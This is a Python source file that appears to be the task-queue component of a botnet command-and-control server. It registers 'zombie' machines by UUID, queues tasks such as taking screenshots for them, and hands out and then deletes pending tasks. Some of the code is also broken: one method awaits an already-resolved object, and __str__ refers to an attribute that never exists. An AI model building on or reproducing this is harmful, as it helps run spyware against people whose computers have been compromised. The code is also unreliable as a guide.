from database.models import Zombis, Task

data={'sadsada' : [{'type' : 'screenshot', 'data':'dsad'}]}

class TasksMenager():
    def __init__(self):
        pass


    async def test(self):
        zombie=await (await Zombis.get_or_create(uuid='5959b7cc-08de-7b1a-a83d-047c16409408'))[0]
        await Task.create(zombie=zombie, type_task='screenshot')
    async def add_task(self, type_task, zombie, data=None) -> None:
        if isinstance(zombie, str):
            zombie=await Zombis.get(uuid=zombie)
        await Task.create(zombie=zombie, type_task=type_task, data=data)

    async def add_pc(self, zombie) -> None:
        await Zombis.create(uuid=zombie)

    async def get_tasks(self, zombie) -> list:
        tasks_format=list()
        tasks=await Task.filter(zombie=zombie)
        for i in tasks:
            tasks_format.append({'type':i.type_task, 'data': i.data})
        await Task.filter(zombie=zombie).delete()
        return tasks_format

    
    def __str__(self):
        return str(self.tasks)